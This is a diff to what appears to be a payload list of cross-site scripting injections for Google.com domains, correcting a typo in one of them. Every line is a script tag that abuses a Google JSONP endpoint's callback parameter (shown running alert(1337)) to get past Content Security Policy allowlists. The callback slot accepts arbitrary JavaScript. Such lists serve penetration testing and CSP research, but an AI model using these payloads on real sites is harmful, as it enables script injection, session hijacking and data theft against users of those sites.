@@ -1,5 +1,5 @@
 #Google.com:
-"><script+src="https://googleads.g.double-click.net/pagead/conversion/1036918760/wcm?callback=alert(1337)"></script>
+"><script+src="https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)"></script>
 "><script+src="https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)"></script>
 "><script+src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>
 "><script+src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
